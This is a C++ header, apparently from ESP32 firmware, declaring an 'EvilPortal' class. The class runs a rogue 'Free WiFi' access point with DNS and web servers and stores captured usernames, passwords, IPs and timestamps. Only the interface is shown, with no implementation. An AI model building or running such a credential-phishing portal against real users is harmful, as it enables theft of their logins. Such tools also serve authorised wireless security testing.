#pragma once
#ifndef EvilPortal_h
#define EvilPortal_h

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <LinkedList.h>
#include "configs.h"

struct CapturedCred {
    String username;
    String password;
    String ip;
    unsigned long timestamp;
};

class EvilPortal {
private:
    WebServer* _server;
    DNSServer* _dns;
    bool _running;
    String _portalSSID;
    LinkedList<CapturedCred> _captured;
    SemaphoreHandle_t _mutex;
    int _clientCount;

    static EvilPortal* _instance;
    static void handleRoot();
    static void handleLogin();
    static void handleNotFound();

public:
    EvilPortal();
    ~EvilPortal();

    void begin(const String& ssid = "Free WiFi");
    void start();          // alias for begin
    void stop();
    void handleClient();   // call in loop
    void update();         // alias for handleClient

    bool isRunning() { return _running; }
    int getCapturedCount();
    CapturedCred getCapturedCred(int index);
    void clearCaptured();
    int getClientCount() { return _clientCount; }
};

#endif
